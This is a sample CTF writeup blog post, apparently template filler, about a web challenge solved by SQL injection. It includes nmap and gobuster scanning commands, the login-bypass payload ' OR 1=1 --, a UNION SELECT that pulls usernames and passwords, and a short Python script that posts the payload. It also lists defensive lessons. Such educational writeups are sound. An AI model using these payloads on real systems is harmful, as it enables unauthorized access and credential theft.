---
title: "Sample CTF Challenge - Web Exploitation"
description: "A walkthrough of a sample web exploitation challenge demonstrating common techniques"
date: 2024-01-15
tags: ["web", "exploitation", "sql-injection"]
categories: ["Web Exploitation"]
author: "Hexora"
toc: true
---

## Challenge Overview

This is a sample CTF writeup to demonstrate how your blog will look. The challenge involves exploiting a web application vulnerable to SQL injection.

![CTF Challenge Banner](/images/ctf-banner.jpg)

## Initial Reconnaissance

First, let's examine the target application:

```bash
# Port scanning
nmap -sV -sC target.com

# Directory enumeration
gobuster dir -u http://target.com -w /usr/share/wordlists/dirb/common.txt
```

![Port Scan Results](/images/port-scan.png)

## Vulnerability Analysis

The application appears to have a login form that's vulnerable to SQL injection:

```sql
' OR 1=1 --
' UNION SELECT username,password FROM users --
```

![Vulnerable Login Form](/images/login-form.png)

## Exploitation

Here's the Python script I used to exploit the vulnerability:

```python
import requests

def exploit_sql_injection(url):
    payload = "' OR 1=1 --"
    data = {"username": payload, "password": "anything"}
    
    response = requests.post(url + "/login", data=data)
    
    if "Welcome" in response.text:
        print("[+] SQL injection successful!")
        return True
    return False

# Test the exploit
exploit_sql_injection("http://target.com")
```

![Exploitation Success](/images/exploit-success.png)

## Flag Capture

After successful exploitation, the flag was revealed:

```
flag{5ql_1nj3ct10n_15_fun}
```

![Flag Captured](/images/flag-captured.png)

## Lessons Learned

1. **Always validate user input** - The application failed to sanitize SQL queries
2. **Use parameterized queries** - This prevents SQL injection attacks
3. **Implement proper authentication** - Don't rely on client-side validation

## Tools Used

- Nmap for port scanning
- Gobuster for directory enumeration
- Python requests library for exploitation
- Burp Suite for request manipulation

![Tools Used](/images/tools-used.png)

---

*This is a sample writeup to demonstrate the blog structure. Replace with your actual CTF solutions!*
